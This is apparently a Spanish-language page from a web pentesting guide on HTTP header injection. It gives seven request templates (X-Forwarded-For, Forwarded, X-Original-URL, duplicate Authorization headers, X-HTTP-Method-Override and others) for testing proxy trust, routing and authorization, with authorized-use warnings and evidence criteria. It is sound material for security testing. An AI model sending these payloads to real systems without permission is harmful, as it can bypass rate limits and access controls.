# 🗡️ Header injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. X-Forwarded-For no confiable

**Objetivo:** Comparar una request propia con y sin cabecera; no usar el valor para atribuir IP real.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
X-Forwarded-For: 192.0.2.123
```

**Interpretación:** Solo es hallazgo si cambia una decisión de seguridad, por ejemplo rate limit o acceso.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 2. Forwarded estandarizada

**Objetivo:** Algunas pilas confían en `Forwarded` en vez de X-Forwarded-*.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Forwarded: for=192.0.2.123;proto=https;host={CONTROLLED_HOST}
```

**Interpretación:** Verificar qué componente consume cada parámetro; un eco en logs no es bypass.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 3. X-Forwarded-Proto

**Objetivo:** Comprobar si una cabecera cliente cambia redirecciones o cookies seguras.

```http
GET /login HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Proto: http
```

**Interpretación:** Comparar Location y Set-Cookie en una sesión propia; proxy puede sobrescribirla.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 4. X-Original-URL

**Objetivo:** Ruta de prueba bajo control propio; buscar routing alterno de reverse proxy.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Original-URL: /api/test-owned
```

**Interpretación:** Un cambio de ruta demuestra reescritura; autorización indebida requiere prueba adicional.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 5. X-Rewrite-URL

**Objetivo:** Variante documentada de override de URL.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Rewrite-URL: /api/test-owned
```

**Interpretación:** Comparar con request directa y confirmar que no es redirección del cliente.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/access-control).

### 6. Cabecera duplicada de autorización

**Objetivo:** Solo con tokens propios A y B para observar precedencia entre capas.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Authorization: Bearer {TOKEN_B}
```

**Interpretación:** Muchos servidores rechazan duplicados; una identidad inesperada requiere demostrar cuál parser eligió cada valor.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 7. X-HTTP-Method-Override

**Objetivo:** Solo con una operación reversible sobre un objeto propio; comparar método reconocido por proxy y aplicación.

```http
POST /api/test-owned HTTP/1.1
Host: {ORIGEN}
X-HTTP-Method-Override: PUT
Content-Type: application/json

{"name":"prueba-123"}
```

**Interpretación:** Diferencia de autorización entre proxy y aplicación requiere evidencia de la operación aplicada; revertir el cambio.

**Fuente técnica:** [documentación de la técnica](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management/06-HTTP_Methods/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
